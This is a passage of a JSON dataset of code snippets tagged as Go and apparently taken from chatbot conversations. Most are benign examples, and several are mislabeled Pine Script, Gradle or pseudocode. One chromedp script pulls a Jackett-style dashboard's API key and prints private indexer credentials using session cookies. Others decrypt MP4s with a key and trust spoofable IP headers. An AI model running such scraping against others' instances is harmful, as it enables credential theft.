    "code": "package main\n\nimport (\n\t\"bytes\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\nfunc httpRequestToString(req *http.Request) (string, error) {\n\t// 保存原始请求体以便后面恢复\n\tvar bodyBytes []byte\n\tif req.Body != nil {\n\t\tbodyBytes, _ = ioutil.ReadAll(req.Body)\n\t\t// 上面读取了请求体，需要重新设置进去\n\t\treq.Body = ioutil.NopCloser(bytes.NewBuffer(bodyBytes))\n\t}\n\n\t// 开始构建请求字符串\n\tvar requestString bytes.Buffer\n\n\t// 请求行\n\trequestLine := fmt.Sprintf(\"%s %s %s\\r\\n\", req.Method, req.URL, req.Proto)\n\trequestString.WriteString(requestLine)\n\n\t// 请求头\n\treq.Header.Write(&requestString)\n\trequestString.WriteString(\"\\r\\n\")\n\n\t// 请求体\n\tif bodyBytes != nil {\n\t\trequestString.Write(bodyBytes)\n\t}\n\n\treturn requestString.String(), nil\n}\n\nfunc main() {\n\t// 假设我们有一个http.Request对象\n\treq, _ := http.NewRequest(\"POST\", \"http://example.com\", bytes.NewBufferString(\"request body\"))\n\n\treqStr, err := httpRequestToString(req)\n\tif err != nil {\n\t\tfmt.Println(\"Error converting request to string:\", err)\n\t\treturn\n\t}\n\n\tfmt.Println(reqStr)\n}",
    "filename": "dd83d088d285ee71a969ed50082fb317_0.go"
  },
  {
    "conversation_hash": "dd83d088d285ee71a969ed50082fb317",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net\"\n\t\"net/http\"\n)\n\nfunc getRealIP(r *http.Request) string {\n\t// 首先检查 Cloudflare 的 `CF-Connecting-IP` 头部\n\tif ip := r.Header.Get(\"CF-Connecting-IP\"); ip != \"\" {\n\t\treturn ip\n\t}\n\t\n\t// 然后是 X-Forwarded-For 头部，它可能包含多个IP地址\n\txForwardedFor := r.Header.Get(\"X-Forwarded-For\")\n\tif xForwardedFor != \"\" {\n\t\tips := strings.Split(xForwardedFor, \",\")\n\t\tif len(ips) > 0 {\n\t\t\t// 取数组中的第一个IP，它应该是用户的真实IP\n\t\t\treturn strings.TrimSpace(ips[0])\n\t\t}\n\t}\n\n\t// X-Real-IP 作为后备选项\n\tif ip := r.Header.Get(\"X-Real-IP\"); ip != \"\" {\n\t\treturn ip\n\t}\n\n\t// 如果没有代理，或者所有头部都缺失，就退回到默认的 RemoteAddr\n\tip, _, err := net.SplitHostPort(r.RemoteAddr)\n\tif err != nil {\n\t\treturn \"\"\n\t}\n\treturn ip\n}\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\tip := getRealIP(r)\n\tfmt.Fprintf(w, \"Your IP: %s\", ip)\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/\", handler)\n\thttp.ListenAndServe(\":8080\", nil)\n}",
    "filename": "dd83d088d285ee71a969ed50082fb317_1.go"
  },
  {
    "conversation_hash": "dd83d088d285ee71a969ed50082fb317",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"net/http\"\n)\n\ntype IPInfo struct {\n\tIP       string `json:\"ip\"`\n\tHostname string `json:\"hostname\"`\n\tCity     string `json:\"city\"`\n\tRegion   string `json:\"region\"`\n\tCountry  string `json:\"country\"`\n\tLoc      string `json:\"loc\"`\n\tOrg      string `json:\"org\"`\n\tPostal   string `json:\"postal\"`\n\tTimezone string `json:\"timezone\"`\n}\n\nfunc getIPInfo(ip string) (*IPInfo, error) {\n\t// 替换 YOUR_ACCESS_TOKEN 为你在 ipinfo.io 注册的真实 token\n\turl := fmt.Sprintf(\"https://ipinfo.io/%s?token=YOUR_ACCESS_TOKEN\", ip)\n\tresp, err := http.Get(url)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tdefer resp.Body.Close()\n\n\tvar ipInfo IPInfo\n\terr = json.NewDecoder(resp.Body).Decode(&ipInfo)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\treturn &ipInfo, nil\n}\n\nfunc main() {\n\t// 假设我们获取到了客户端的 IP 地址\n\tclientIP := \"8.8.8.8\" // 示例: Google DNS IP\n\n\tipInfo, err := getIPInfo(clientIP)\n\tif err != nil {\n\t\tfmt.Println(\"Error getting IP info:\", err)\n\t\treturn\n\t}\n\n\t// 打印获取到的 IP 信息\n\tfmt.Printf(\"City: %s\\nRegion: %s\\nCountry: %s\\nLocation: %s\\n\", ipInfo.City, ipInfo.Region, ipInfo.Country, ipInfo.Loc)\n}",
    "filename": "dd83d088d285ee71a969ed50082fb317_2.go"
  },
  {
    "conversation_hash": "dd83d088d285ee71a969ed50082fb317",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n)\n\nfunc main() {\n\t// 定义两个JSON对象的[]byte形式\n\tjsonBytes1 := []byte(`{\"key1\":\"value1\",\"key2\":\"value2\"}`)\n\tjsonBytes2 := []byte(`{\"key3\":\"value3\",\"key4\":\"value4\"}`)\n\n\t// 将JSON数据解码为map\n\tvar map1, map2 map[string]interface{}\n\terr := json.Unmarshal(jsonBytes1, &map1)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\terr = json.Unmarshal(jsonBytes2, &map2)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\t// 合并两个map\n\tfor k, v := range map2 {\n\t\tmap1[k] = v\n\t}\n\n\t// 将合并后的map编码为JSON []byte\n\tmergedJSON, err := json.Marshal(map1)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\tfmt.Println(string(mergedJSON)) // 输出合并后的JSON字符串\n}",
    "filename": "dd83d088d285ee71a969ed50082fb317_3.go"
  },
  {
    "conversation_hash": "dd83d088d285ee71a969ed50082fb317",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\n// 设置CORS中间件，允许跨域请求\nfunc enableCorsMiddleware(next http.Handler) http.Handler {\n\treturn http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n\t\t// 设置CORS头部\n\t\tw.Header().Set(\"Access-Control-Allow-Origin\", \"*\") // 注意：在生产环境中通常不使用 \"*\", 应该指定明确的域名\n\t\tw.Header().Set(\"Access-Control-Allow-Methods\", \"POST, GET, OPTIONS, PUT, DELETE\")\n\t\tw.Header().Set(\"Access-Control-Allow-Headers\", \"Accept, Content-Type, Content-Length, Accept-Encoding, X-CSRF-Token, Authorization\")\n\n\t\t// 检查是否是预检请求并直接返回以避免执行实际的处理函数\n\t\tif r.Method == \"OPTIONS\" {\n\t\t\t// 允许预检请求\n\t\t\tw.WriteHeader(http.StatusOK)\n\t\t\treturn\n\t\t}\n\n\t\t// 继续处理请求\n\t\tnext.ServeHTTP(w, r)\n\t})\n}\n\nfunc mainHandler(w http.ResponseWriter, r *http.Request) {\n\t// 你的处理逻辑\n\tfmt.Fprintf(w, \"Hello, CORS enabled world!\")\n}\n\nfunc main() {\n\thttp.Handle(\"/\", enableCorsMiddleware(http.HandlerFunc(mainHandler)))\n\thttp.ListenAndServe(\":8080\", nil)\n}",
    "filename": "dd83d088d285ee71a969ed50082fb317_4.go"
  },
  {
    "conversation_hash": "dd83d088d285ee71a969ed50082fb317",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"net/http\"\n)\n\nfunc enableCORS(w *http.ResponseWriter) {\n\t(*w).Header().Set(\"Access-Control-Allow-Origin\", \"*\") // 替换 \"*\" 为你的实际的域名\n\t(*w).Header().Set(\"Access-Control-Allow-Methods\", \"POST, GET, OPTIONS, PUT, DELETE\")\n\t(*w).Header().Set(\"Access-Control-Allow-Headers\", \"Accept, Content-Type, Content-Length, Accept-Encoding, X-CSRF-Token, Authorization\")\n}\n\nfunc preflightHandler(w http.ResponseWriter, r *http.Request) {\n\tenableCORS(&w)\n\tif r.Method == \"OPTIONS\" {\n\t\tw.WriteHeader(http.StatusOK)\n\t\treturn\n\t}\n}\n\nfunc yourHandler(w http.ResponseWriter, r *http.Request) {\n\tenableCORS(&w)\n\t// ... 处理你的POST, GET, PUT等非预检请求 ...\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/\", preflightHandler) // 处理预检请求\n\thttp.HandleFunc(\"/your-endpoint\", yourHandler) // 你的业务逻辑处理程序\n\thttp.ListenAndServe(\":8080\", nil)\n}",
    "filename": "dd83d088d285ee71a969ed50082fb317_5.go"
  },
  {
    "conversation_hash": "45c3356ec2cff361eb70662b0ab0658d",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "pdfFile := \"path/to/your/pdf/file.pdf\"\n\n   f, err := os.Open(pdfFile)\n   if err != nil {\n       log.Fatalf(\"Error opening PDF file: %v\", err)\n   }\n   defer f.Close()\n\n   pdfReader, err := extractor.NewPdfReader(f)\n   if err != nil {\n       log.Fatalf(\"Error reading PDF file: %v\", err)\n   }",
    "filename": "45c3356ec2cff361eb70662b0ab0658d_2.go"
  },
  {
    "conversation_hash": "45c3356ec2cff361eb70662b0ab0658d",
    "code_index": 3,
    "language": "Go",
    "libraries": [
      "page"
    ],
    "code": "numPages, err := pdfReader.GetNumPages()\n   if err != nil {\n       log.Fatalf(\"Error getting number of pages: %v\", err)\n   }\n\n   for i := 1; i <= numPages; i++ {\n       page, err := pdfReader.GetPage(i)\n       if err != nil {\n           log.Fatalf(\"Error getting page %d: %v\", i, err)\n       }\n\n       // Extract text content\n       content, err := page.GetPlainText(nil)\n       if err != nil {\n           log.Fatalf(\"Error extracting text from page %d: %v\", i, err)\n       }\n\n       fmt.Println(content) // or store it in a variable or file\n   }",
    "filename": "45c3356ec2cff361eb70662b0ab0658d_3.go"
  },
  {
    "conversation_hash": "55ac99506a1f88a4971e8185bb9ff5df",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"strconv\"\n)\n\nfunc main() {\n\tnum := 1234567890\n\tposition := 7\n\n\t// Convert the integer to a string\n\tnumStr := strconv.Itoa(num)\n\n\t// Access the character at the desired position (adjusted for 0-based indexing)\n\tdigit := numStr[position-1]\n\n\t// Print the digit\n\tfmt.Println(\"Digit at position\", position, \"is\", string(digit))\n}",
    "filename": "55ac99506a1f88a4971e8185bb9ff5df_0.go"
  },
  {
    "conversation_hash": "c2ac1948a9b75c238142958ca463a629",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\n// #cgo LDFLAGS: -L/path/to/your/library -lmp4decrypt\n// #include \"mp4decrypt.h\"\nimport \"C\"\n\nimport (\n\t\"fmt\"\n\t\"unsafe\"\n)\n\nfunc decryptFile(inputFile, outputFile, key string) {\n\tcInputFile := C.CString(inputFile)\n\tdefer C.free(unsafe.Pointer(cInputFile))\n\n\tcOutputFile := C.CString(outputFile)\n\tdefer C.free(unsafe.Pointer(cOutputFile))\n\n\tcKey := C.CString(key)\n\tdefer C.free(unsafe.Pointer(cKey))\n\n\tC.decrypt_file(cInputFile, cOutputFile, cKey)\n}\n\nfunc main() {\n\tinput := \"encrypted.mp4\"\n\toutput := \"decrypted.mp4\"\n\tkey := \"your_decryption_key\"\n\n\tdecryptFile(input, output, key)\n\n\tfmt.Println(\"Decryption completed.\")\n}",
    "filename": "c2ac1948a9b75c238142958ca463a629_1.go"
  },
  {
    "conversation_hash": "c2ac1948a9b75c238142958ca463a629",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os/exec\"\n)\n\nfunc main() {\n\tinput := \"encrypted.mp4\"\n\toutput := \"decrypted.mp4\"\n\tkey := \"your_decryption_key\"\n\n\tcmd := exec.Command(\"mp4decrypt\", \"--key\", key, input, output)\n\n\terr := cmd.Run()\n\tif err != nil {\n\t\tfmt.Println(\"Decryption failed:\", err)\n\t\treturn\n\t}\n\n\tfmt.Println(\"Decryption completed.\")\n}",
    "filename": "c2ac1948a9b75c238142958ca463a629_2.go"
  },
  {
    "conversation_hash": "abb1cdc0e0fc5c7abc75f4dd598c3891",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n  \"fmt\"\n)\n\nconst (\n  a = iota // 0\n  b = iota // 1\n  c = iota // 2\n)\n\nconst (\n  d = iota // 0 (it resets to 0)\n  e = iota // 1\n  f = iota // 2\n)\n\nfunc main() {\n  fmt.Println(a, b, c) // Output: 0 1 2\n  fmt.Println(d, e, f) // Output: 0 1 2\n}",
    "filename": "abb1cdc0e0fc5c7abc75f4dd598c3891_0.go"
  },
  {
    "conversation_hash": "abb1cdc0e0fc5c7abc75f4dd598c3891",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"strconv\"\n)\n\nfunc main() {\n\tnum := 12345\n\n\t// Convert the integer to a string\n\tnumStr := strconv.Itoa(num)\n\n\t// Iterate over each character in the string\n\tfor _, digitStr := range numStr {\n\t\t// Convert each digit back to an integer\n\t\tdigit, err := strconv.Atoi(string(digitStr))\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Error converting digit:\", err)\n\t\t\treturn\n\t\t}\n\n\t\t// Print the digit\n\t\tfmt.Println(digit)\n\t}\n}",
    "filename": "abb1cdc0e0fc5c7abc75f4dd598c3891_1.go"
  },
  {
    "conversation_hash": "700e6be8a6855e53f265b2e9a11702dc",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nindicator(\"Histogram\", overlay=true)\n// Diğer tanımlamalar ve hesaplamalar...\n\nshowhist := true // Varsayalım ki bu bir kullanıcı girdisi veya hesaplama sonucu\nsig := close // Örnek bir sinyal değeri (Kendi hesaplamanıza göre değiştirin)\nma := ta.sma(close, 14) // 14 günlük basit hareketli ortalama (Kendi hesaplamanıza göre değiştirin)\n\n// Renkleri ve saydamlığı ayarlayan fonksiyon\ngetHistColor(sig, ma) =>\n    sig > ma ? color.new(color.blue, 80) : color.new(color.orange, 80)\n\n// Plot komutu\nplot(showhist ? sig - ma : na, color=getHistColor(sig, ma), style=plot.style_area, title='Histogram')",
    "filename": "700e6be8a6855e53f265b2e9a11702dc_2.go"
  },
  {
    "conversation_hash": "97054a2fa91fb4e4610e279b2682fb6f",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n\t// 创建一个整数切片\n\tnumbers := []int{1, 2, 3, 4, 5}\n\n\t// 输出整个切片\n\tfmt.Println(numbers)\n\n\t// 输出切片的长度和容量\n\tfmt.Println(\"长度：\", len(numbers))\n\tfmt.Println(\"容量：\", cap(numbers))\n\n\t// 输出切片中的元素\n\tfmt.Println(\"第一个元素：\", numbers[0])\n\tfmt.Println(\"最后一个元素：\", numbers[len(numbers)-1])\n\n\t// 切片的切片\n\tslice := numbers[1:3]\n\tfmt.Println(\"切片：\", slice)\n\n\t// 修改切片中的元素\n\tslice[0] = 10\n\tfmt.Println(numbers)\n\n\t// 向切片末尾追加元素\n\tnumbers = append(numbers, 6)\n\tfmt.Println(numbers)\n\n\t// 创建一个空切片\n\temptySlice := make([]int, 0)\n\tfmt.Println(emptySlice)\n\n\t// 判断切片是否为空\n\tfmt.Println(\"切片是否为空：\", len(emptySlice) == 0)\n\n\t// 复制切片\n\tcopySlice := make([]int, len(numbers))\n\tcopy(copySlice, numbers)\n\tfmt.Println(\"复制切片：\", copySlice)\n}",
    "filename": "97054a2fa91fb4e4610e279b2682fb6f_0.go"
  },
  {
    "conversation_hash": "97054a2fa91fb4e4610e279b2682fb6f",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n\tstr := \"Hello, World!\"\n\n\t// 使用切片提取 \"World\"\n\tslice := str[7:12]\n\n\tfmt.Println(slice) // 输出：World\n}",
    "filename": "97054a2fa91fb4e4610e279b2682fb6f_2.go"
  },
  {
    "conversation_hash": "9456e44aa12a163b3e265ce65e46a7e2",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "// Déclaration des tableaux et de leur taille\ntableau1 := [1, 2, 3, 4, 5]\ntableau2 := [2, 3, 4, 5, 6]\ntaille := longueur(tableau1)  // Les deux tableaux doivent avoir la même taille\n\n// Initialisation de la variable produit\nproduit := 0\n\n// Calcul du produit\nPour i allant de 0 à taille - 1 faire :\n    produit := produit + tableau1[i] * tableau2[i]\n\n// Affichage du résultat\nAfficher produit",
    "filename": "9456e44aa12a163b3e265ce65e46a7e2_0.go"
  },
  {
    "conversation_hash": "94fac536b9c2b3f2da031675e0db6f0a",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "\"AbilitySpecial\"\n{\n\t\"01\"\n\t{\n\t\t\"var_type\" \"FIELD_INTEGER\"\n\t\t\"damage\" \"100\"\n\t\t\"RequiresScepter\" \"1\"\n\t}\n\t\"02\"\n\t{\n\t\t\"var_type\" \"FIELD_INTEGER\"\n\t\t\"range\" \"300\"\n\t\t\"RequiresScepter\" \"1\"\n\t}\n\t\"03\"\n\t{\n\t\t\"var_type\" \"FIELD_FLOAT\"\n\t\t\"cooldown\" \"10.0\"\n\t}\n}",
    "filename": "94fac536b9c2b3f2da031675e0db6f0a_6.go"
  },
  {
    "conversation_hash": "8617c10e7c5356f10c2b09ecdebce707",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(\"RSI and ADX Strategy\", overlay=true)\n\n// RSI settings\nrsiLength = input(14, title=\"RSI Length\")\nrsiOverbought = input(70, title=\"RSI Overbought Level\")\nrsiOversold = input(30, title=\"RSI Oversold Level\")\nrsi = ta.rsi(close, rsiLength)\n\n// ADX settings\nadxLength = input(14, title=\"ADX Length\")\nadxLevel = input(25, title=\"ADX Level\")\n[adx, diPlus, diMinus] = ta.dmi(adxLength)\n\n// Conditions for longing\nlongCondition = rsi < rsiOversold and adx > adxLevel and diPlus > diMinus\n\n// Conditions for shorting\nshortCondition = rsi > rsiOverbought and adx > adxLevel and diMinus > diPlus\n\n// Entry and exit orders\nif (longCondition)\n    strategy.entry(\"Long\", strategy.long)\n\nif (shortCondition)\n    strategy.entry(\"Short\", strategy.short)\n\n// Plot RSI and ADX\nplot(rsi, \"RSI\", color=color.blue)\nhline(rsiOverbought, \"Overbought\", color=color.red)\nhline(rsiOversold, \"Oversold\", color=color.green)\n\nplot(adx, \"ADX\", color=color.orange)\nhline(adxLevel, \"ADX Level\", color=color.purple)\n\n// Change strategy settings according to preferences\nstrategy.exit(\"Exit Long\", \"Long\", when=rsi > rsiOverbought)\nstrategy.exit(\"Exit Short\", \"Short\", when=rsi < rsiOversold)",
    "filename": "8617c10e7c5356f10c2b09ecdebce707_1.go"
  },
  {
    "conversation_hash": "8a14f49e2a2a6072fb69d40ca17036b7",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"context\"\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"io\"\n\t\"log\"\n\t\"net/http\"\n\t\"os\"\n\t\"strings\"\n\t\"time\"\n\n\t\"github.com/chromedp/chromedp\"\n)\n\nfunc main() {\n\tif len(os.Args) < 2 {\n\t\tfmt.Println(\"Usage: go run main.go <url>\")\n\t\treturn\n\t}\n\n\turl := os.Args[1]\n\tif err := playVideo(url); err != nil {\n\t\tlog.Fatal(\"Error:\", err)\n\t}\n}\n\nfunc playVideo(url string) error {\n\topts := append(chromedp.DefaultExecAllocatorOptions[:],\n\t\tchromedp.ExecPath(\"./chrome-linux/chrome\"),\n\t\tchromedp.Headless,\n\t\tchromedp.NoSandbox,\n\t\tchromedp.DisableGPU,\n\t\tchromedp.IgnoreCertificateErrors,\n\t)\n\n\tctx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)\n\tdefer cancel()\n\n\tctx, cancel = chromedp.NewContext(ctx, chromedp.WithLogf(log.Printf))\n\tdefer cancel()\n\n\tctx, cancel = context.WithTimeout(ctx, 5*time.Minute)\n\tdefer cancel()\n\n\tvar firstResult string\n\tif err := chromedp.Run(ctx,\n\t\tchromedp.Navigate(url),\n\t\tchromedp.WaitVisible(`b.api-key-text`),\n\t\tchromedp.Text(`b.api-key-text`, &firstResult),\n\t); err != nil {\n\t\treturn fmt.Errorf(\"error getting first result: %v\", err)\n\t}\n\n\tcurrentURL := \"\"\n\tif err := chromedp.Run(ctx, chromedp.Location(&currentURL)); err != nil {\n\t\treturn fmt.Errorf(\"error getting current URL: %v\", err)\n\t}\n\n\tnewURL := strings.Replace(currentURL, \"UI/Dashboard\", \"api/v2.0/indexers?configured=true\", 1)\n\n\tvar responseBody string\n\tif err := chromedp.Run(ctx,\n\t\tchromedp.Navigate(newURL),\n\t\tchromedp.WaitVisible(`body`),\n\t\tchromedp.InnerHTML(`body`, &responseBody),\n\t); err != nil {\n\t\treturn fmt.Errorf(\"error getting response body: %v\", err)\n\t}\n\n\tvar response []map[string]interface{}\n\tif err := json.Unmarshal([]byte(responseBody), &response); err != nil {\n\t\treturn fmt.Errorf(\"error unmarshalling JSON response: %v\", err)\n\t}\n\n\tprivateItems := make([]map[string]interface{}, 0)\n\tfor _, item := range response {\n\t\titemType := strings.ToLower(fmt.Sprintf(\"%v\", item[\"type\"]))\n\t\tconfigured := strings.ToLower(fmt.Sprintf(\"%v\", item[\"configured\"]))\n\n\t\tif strings.Contains(itemType, \"private\") && configured == \"true\" {\n\t\t\tprivateItems = append(privateItems, item)\n\t\t}\n\t}\n\n\tif len(privateItems) == 0 {\n\t\treturn nil\n\t}\n\n\tfmt.Printf(\"\\nTorznab key: %s\\n\", firstResult)\n\n\tfor _, item := range privateItems {\n\t\tid := fmt.Sprintf(\"%v\", item[\"id\"])\n\t\tconfigURL := strings.Replace(currentURL, \"UI/Dashboard\", fmt.Sprintf(\"api/v2.0/indexers/%s/config\", id), 1)\n\n\t\tconfigResponse, err := getConfigResponseWithCookies(configURL, ctx)\n\t\tif err != nil {\n\t\t\tfmt.Printf(\"##%s | %s | %v\\n\", id, configURL, err)\n\t\t\tcontinue\n\t\t}\n\n\t\tfilteredElements := make([]string, 0)\n\t\tfor _, element := range configResponse {\n\t\t\telementType := fmt.Sprintf(\"%v\", element[\"type\"])\n\t\t\telementValue := fmt.Sprintf(\"%v\", element[\"value\"])\n\n\t\t\tif elementType == \"inputstring\" && elementValue != \"true\" && elementValue != \"false\" {\n\t\t\t\tfilteredElements = append(filteredElements, elementValue)\n\t\t\t}\n\t\t}\n\n\t\tgroupedValues := strings.Join(filteredElements, \" | \")\n\t\tprefixedGroupedValues := id + \" | \" + groupedValues\n\t\tfmt.Println(prefixedGroupedValues)\n\t}\n\n\treturn nil\n}\n\nfunc getConfigResponseWithCookies(url string, ctx context.Context) ([]map[string]interface{}, error) {\n\tcookies, err := chromedp.Cookies(ctx)\n\tif err != nil {\n\t\treturn nil, fmt.Errorf(\"error getting cookies: %v\", err)\n\t}\n\n\tclient := &http.Client{}\n\treq, err := http.NewRequest(\"GET\", url, nil)\n\tif err != nil {\n\t\treturn nil, fmt.Errorf(\"error creating request: %v\", err)\n\t}\n\n\tfor _, cookie := range cookies {\n\t\treq.AddCookie(&http.Cookie{\n\t\t\tName:  cookie.Name,\n\t\t\tValue: cookie.Value,\n\t\t})\n\t}\n\n\tctx, cancel := context.WithTimeout(ctx, 10*time.Second)\n\tdefer cancel()\n\n\treq = req.WithContext(ctx)\n\n\tresp, err := client.Do(req)\n\tif err != nil {\n\t\treturn nil, fmt.Errorf(\"error sending request: %v\", err)\n\t}\n\tdefer resp.Body.Close()\n\n\tbody, err := io.ReadAll(resp.Body)\n\tif err != nil {\n\t\treturn nil, fmt.Errorf(\"error reading response body: %v\", err)\n\t}\n\n\tvar response []map[string]interface{}\n\tif err := json.Unmarshal(body, &response); err != nil {\n\t\treturn nil, fmt.Errorf(\"error unmarshalling JSON response: %v\", err)\n\t}\n\n\treturn response, nil\n}",
    "filename": "8a14f49e2a2a6072fb69d40ca17036b7_3.go"
  },
  {
    "conversation_hash": "c3c575e884d7bf1efd6190a173e237b6",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "# Файл: /etc/dibbler/server.conf\n\n# Задаем IPv4 интерфейс\niface \"ens34\" {\n    # Задаем серверный IPv4-адрес\n    address 192.168.100.62/24\n    # Задаем диапазон адресов для выдачи клиентам\n    pool 192.168.100.2-192.168.100.61/24\n}",
    "filename": "c3c575e884d7bf1efd6190a173e237b6_1.go"
  },
  {
    "conversation_hash": "86c4e3f7fe418d1276ea0fbd2b040674",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "// Add Jetpack Compose dependencies\nandroid {\n    ...\n    compileSdkVersion 30 // or whatever the latest SDK you have\n\n    defaultConfig {\n        ...\n        minSdkVersion 21 // or higher for Jetpack Compose\n        ...\n    }\n\n    buildFeatures {\n        // Enables Jetpack Compose for this module\n        compose true\n    }\n\n    composeOptions {\n        kotlinCompilerExtensionVersion compose_version // replace with latest compose version\n    }\n    ...\n}\n\ndependencies {\n    implementation(\"androidx.core:core-ktx:latest_version\")\n    implementation(\"androidx.compose.ui:ui:compose_version\")\n    implementation(\"androidx.compose.material:material:compose_version\")\n    implementation(\"androidx.compose.ui:ui-tooling-preview:compose_version\")\n    ...\n    // Test dependencies for Compose\n    androidTestImplementation(\"androidx.compose.ui:ui-test-junit4:compose_version\")\n}",
    "filename": "86c4e3f7fe418d1276ea0fbd2b040674_1.go"
  },
  {
    "conversation_hash": "a837465edd996ab9f2afc6ac5f83ad06",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc QuadB(x, y int) {\n    // Check if x and y are positive numbers\n    if x <= 0 || y <= 0 {\n        return\n    }\n\n    // Print the top line of the rectangle\n    fmt.Print(\"/***\\\\\")\n    fmt.Println()\n\n    // Print the middle lines of the rectangle\n    for i := 0; i < y-2; i++ {\n        fmt.Print(\"*   *\")\n        fmt.Println()\n    }\n\n    // Print the bottom line of the rectangle\n    fmt.Print(\"\\\\***/\")\n    fmt.Println()\n}\n\nfunc main() {\n    QuadB(5, 3)\n}",
    "filename": "a837465edd996ab9f2afc6ac5f83ad06_0.go"
  },
  {
    "conversation_hash": "8f289f43c807b28cba636ac9547f0b49",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n    var x, p, y int\n    // x = initial amount in rubles\n    // p = annual interest rate in percent\n    // y = target amount in deposit, at least as many rubles\n    // output one integer - how many years will it take for the deposit to reach at least y rubles\n\n    fmt.Scan(&x, &p, &y)\n\n    years := 0\n    balance := x\n\n    for {\n        balance += balance * p / 100\n        years++\n\n        if balance >= y {\n            break\n        }\n    }\n\n    fmt.Println(years)\n}",
    "filename": "8f289f43c807b28cba636ac9547f0b49_2.go"
  },
  {
    "conversation_hash": "8f289f43c807b28cba636ac9547f0b49",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n    var x, p, y int\n    fmt.Scan(&x, &p, &y)\n\n    years := 0\n    balance := x\n\n    for balance < y {\n        interest := balance * p / 100\n        balance += interest\n        years++\n    }\n\n    fmt.Println(years)\n}",
    "filename": "8f289f43c807b28cba636ac9547f0b49_3.go"
  },
  {
    "conversation_hash": "8f289f43c807b28cba636ac9547f0b49",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n    var num1, num2 int\n    fmt.Scan(&num1, &num2)\n\n    digits := findCommonDigits(num1, num2)\n    for _, digit := range digits {\n        fmt.Printf(\"%d \", digit)\n    }\n}\n\nfunc findCommonDigits(num1, num2 int) []int {\n    digitCount1 := countDigits(num1)\n    digitCount2 := countDigits(num2)\n\n    commonDigits := make([]int, 0)\n    for digit := 0; digit <= 9; digit++ {\n        if digitCount1[digit] > 0 && digitCount2[digit] > 0 {\n            commonDigits = append(commonDigits, digit)\n        }\n    }\n\n    return commonDigits\n}\n\nfunc countDigits(num int) []int {\n    digitCount := make([]int, 10)\n\n    for num > 0 {\n        digit := num % 10\n        digitCount[digit]++\n        num /= 10\n    }\n\n    return digitCount\n}",
    "filename": "8f289f43c807b28cba636ac9547f0b49_4.go"
  },
  {
    "conversation_hash": "be634acc9dc52596fa17d7e5e4efcbea",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "repositories {\n    // другие репозитории вашего проекта\n    maven {\n        url 'https://hub.spigotmc.org/nexus/content/repositories/snapshots/'\n    }\n}",
    "filename": "be634acc9dc52596fa17d7e5e4efcbea_1.go"
  },
  {
    "conversation_hash": "be634acc9dc52596fa17d7e5e4efcbea",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "repositories {\n    // другие репозитории вашего проекта\n    maven {\n        url 'https://hub.spigotmc.org/nexus/content/repositories/snapshots/'\n    }\n}",
    "filename": "be634acc9dc52596fa17d7e5e4efcbea_5.go"
  },
  {
    "conversation_hash": "95dae82323e032a5aa830f34f70fdf1d",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
